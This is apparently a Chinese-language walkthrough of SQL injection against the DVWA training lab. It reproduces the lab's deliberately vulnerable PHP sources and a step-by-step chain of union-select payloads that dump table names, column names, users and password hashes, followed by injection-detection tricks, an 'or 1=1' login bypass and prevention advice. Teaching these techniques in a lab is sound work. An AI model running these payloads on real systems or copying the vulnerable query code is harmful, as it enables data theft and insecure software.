# SQL注入漏洞
## 漏洞描述
Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一。
## SQL注入类型
- get类型

通过get方式进行注入，如：id=1，注入点在id
- post类型

通过post方式进行注入，一般为表单
- cookie类型

http在请求是会带上客户端的cookie，注入点在cookie中，攻击代码在cookie中的某个字段
- http头部注入

注入点在http请求头部的某个字段，如UA中
## 漏洞利用
## Low SQL Injection Source
```
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}

?> 
```
我们查看源码，对输入的内容没有做任何过滤，这使我们可以构造sql语句
1. 判断是否存在sql注入，输入1查看返回的结果
![image](https://user-images.githubusercontent.com/71583369/144423825-d087c046-fcfd-4aa8-880a-3c1f9e6ad5d9.png)

- 使用`1'`发现语句报错
![image](https://user-images.githubusercontent.com/71583369/144424047-9ddfff58-e4bd-4f81-9284-55cbc52b4459.png)
- 尝试1 and 1=1 1 and 1=2 均未发生报错，直接返回了结果
![image](https://user-images.githubusercontent.com/71583369/144424403-c4c34972-9582-417b-9ce8-3d67eb2479ec.png)
- 可以判断出这个语句是使用单引号闭合的，存在sql注入，使用语句使sql语句错误来判断sql注入。
2. 确定列数，使用`order by `进行判断，这里`order by `后需要使用#，将后面的内容注释掉，防止出错
![image](https://user-images.githubusercontent.com/71583369/144430118-354db24f-72ef-47b2-86e6-cd0bec5ef9f3.png)
- 判断`order by 3`时出现报错，可以判断列数是2列
![image](https://user-images.githubusercontent.com/71583369/144430344-167a4182-4dba-494a-a01b-57bc660129ed.png)

3. 查看回显点，使用`1' union select 1,2#`
![image](https://user-images.githubusercontent.com/71583369/144430714-39cf4e64-de32-494f-8056-6023fc73d47d.png)
- 这里把2的位置作为回显点，查看数据库名`1' union select 1,database()#`
![image](https://user-images.githubusercontent.com/71583369/144431209-56e68912-993a-45f9-b1e8-51e47ec62bd4.png)
- 可以看到爆出了数据库的名字是dvwa
4. 爆出表名，
- 输入`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`
- 或者`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#`
- 或者`1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761#     （0x64767761是dvwa的ascii码）`
![image](https://user-images.githubusercontent.com/71583369/144434141-576190e6-e805-453e-adef-d354918172fb.png)
5. 爆出列名
- 输入`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='dvwa'#`
- 或者`1' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=0x64767761#`
- 猜测用户名密码存在users表中，我们爆出users表的列
![image](https://user-images.githubusercontent.com/71583369/144436293-e9f15308-2edd-45ca-bfa4-72872147d354.png)
猜测用户名和密码在user和password
6. 查看用户名和密码
- 使用`1' union select group_concat(user),group_concat(password) from users#`，获取到5个用户名和md5加密的密码
![image](https://user-images.githubusercontent.com/71583369/144437896-70c999bc-3c10-4aff-a781-ebad1250b287.png)
- 解密后的密码：`password，abc123，charley，letmein，password`
## Medium SQL Injection Source
```
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
    // Get input
    $id = $_POST[ 'id' ];

    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Display values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?> 
```
从代码中可以看到，使用`mysqli_real_escape_string()`函数对`\x00  \n  \r  \ '  "  \x1a `进行了转义。不适用闭合符号。
- 这里发现前端不是get方式了，猜测为post方式
![image](https://user-images.githubusercontent.com/71583369/144443354-e2462997-440e-40c4-94f0-9d3c9eba5600.png)
- 使用burp抓包进行修改
![image](https://user-images.githubusercontent.com/71583369/144443504-9ba3bbfc-b659-4c6e-8820-a01dba5dbe68.png)
- 直接猜测用户名和密码的字段
![image](https://user-images.githubusercontent.com/71583369/144443784-d057a639-201e-4bf4-89ec-6f81cf95ecb3.png)
- 可以看出直接爆出，和low级别一样，这里就不再演示。
## High SQL Injection Source
```
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?> 
```
这段代码只是限制了查询的条数，实质对注入没有太大影响。基本和low级别一样。因为我们使用了`group_concat()`函数，将结果输入到一行。这个就不在演示。
## Impossible SQL Injection Source
```
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Check Anti-CSRF token
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    // Get input
    $id = $_GET[ 'id' ];

    // Was a number entered?
    if(is_numeric( $id )) {
        // Check the database
        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
        $data->bindParam( ':id', $id, PDO::PARAM_INT );
        $data->execute();
        $row = $data->fetch();

        // Make sure only 1 result is returned
        if( $data->rowCount() == 1 ) {
            // Get values
            $first = $row[ 'first_name' ];
            $last  = $row[ 'last_name' ];

            // Feedback for end user
            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
        }
    }
}

// Generate Anti-CSRF token
generateSessionToken();

?> 
```
这段代码使用了面向对象和PDO，杜绝了sql注入，无法绕过。
## SQL注入类型
传输的方法有两种，一种GET类型，一种POST类型。两种类型不同的注入位置又可以分为如下几种

- 搜索框注入
- User-Agent注入
- X-ForWarded-For注入
- HOST注入
- Cookie注入
- 宽字节注入，又称绕过类型注入
## 注入方法

- 联合查询注入
  - 将2条SQL语句进行拼接然后进行查询，并将结果输入到一个结果集。
- 报错类型注入
- 堆叠类型注入
- 布尔类型注入（布尔盲注）
- 时间类型注入（时间盲注）
## 判断SQL注入方法
- 单引号判断，60%几率，如get方式的，在后面加上单引号，如果报错，说明存在注入，否则相反
- 除了单引号，单引号测试不成功也可以使用`"`来测试
- and语法判断，99%的机率,有时直接使用`and 1=2`测试不成功，可能是将前面部分和次数作为了一个字符串，不会影响SQL语句，可以使用`’`
- 加上单引号(`35'+and+1=2%23`	无数据     `35'+and+1=1%23`	有数据),不加单引号(`35+and+1=2%23`	无数据   `35+and+1=1%23`	有数据);单引号测试不成，可以是用双引号
- 有时还需要用到注释符来进行测试。MySQL的注释符`#`，`--` 。多数使用`#`居多，**需要注意的是在GET方式的情况情况下，使用`--` ，在URL中空格会默认清楚掉，需要用`+`，也就是`--+`，`+`代表空格。另外在使用burp抓取的数据包中进行测试时，`#`需要进行URL编码，否则不会被执行，相当于一个字符串。**
- `or`语法判断,如`or 1=1  or 1=2`   `or`的语法主要用后台登录处使用，可构造语法，直接登录后台，也就是所说的万能钥匙。
- `xor`和`&&`也可以判断出来
- 加减法测试,如get请求的可在`id=35-1`或`id=3%2b1`这种方式测试，为什么不用`+`号，在url中+代表空格
## 以上判断方法，除了单引号判断，基本可以100%判断出存在SQL注入
## 漏洞防护
1.永远不要信任客户端提交的数据，一定要对客户端提交的数据进行校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。

2.对客户端提交的数据进行转义，例如将" ' "转义为" ' "。

3.采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。

4.避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。

5.严格执行数据库账号权限管理。

6.对用户敏感信息特别是密码做严格加密处理。








